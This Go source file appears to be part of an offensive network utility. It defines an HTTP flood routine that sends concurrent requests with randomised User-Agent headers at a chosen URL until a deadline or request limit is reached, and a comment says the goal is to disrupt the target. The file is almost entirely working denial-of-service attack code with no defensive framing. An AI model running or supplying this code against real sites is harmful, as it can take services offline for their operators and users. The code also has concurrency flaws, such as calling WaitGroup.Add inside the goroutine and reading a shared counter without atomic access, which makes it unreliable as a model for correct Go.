package netutil

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

type HTTPFlood struct {
	Context       context.Context
	MaxRequests   uint64
	NumGoroutines int
	RequestMethod string
	RequestURL    string
	RequestBody   io.Reader
}

// Attack sends requests in a loop (with the given number of concurrent goroutines)
// until the deadline is exceeded or the maximum number of requests has been reached.
func (hf *HTTPFlood) Attack() error {
	var numSent uint64
	errChan := make(chan error)
	defer close(errChan)
	wg := &sync.WaitGroup{}

	for i := 0; i < hf.NumGoroutines; i++ {
		go func(wg *sync.WaitGroup, numSent *uint64) {
			wg.Add(1)
			defer wg.Done()

			for {
				// stop attack if deadline is exceeded
				if deadline, _ := hf.Context.Deadline(); deadline.Before(time.Now()) {
					break
				}

				// stop if max requests is exceeded or increment counter
				if hf.MaxRequests > 0 {
					if *numSent >= hf.MaxRequests {
						break
					}
					atomic.AddUint64(numSent, 1)
				}

				req, err := http.NewRequestWithContext(hf.Context, hf.RequestMethod, hf.RequestURL, hf.RequestBody)
				req.Header.Add("User-Agent", RandUserAgent(nil))
				if err != nil {
					errChan <- err
					return
				}

				_, err = http.DefaultClient.Do(req)
				if err != nil {
					// todo: refactor
					// in this case, the error could be due to our actions disrupting the target
					fmt.Println("http flood response err:", err)

					<-errChan
					return
				}
			}

			errChan <- nil
			return
		}(wg, &numSent)
	}

	wg.Wait()
	return <-errChan
}
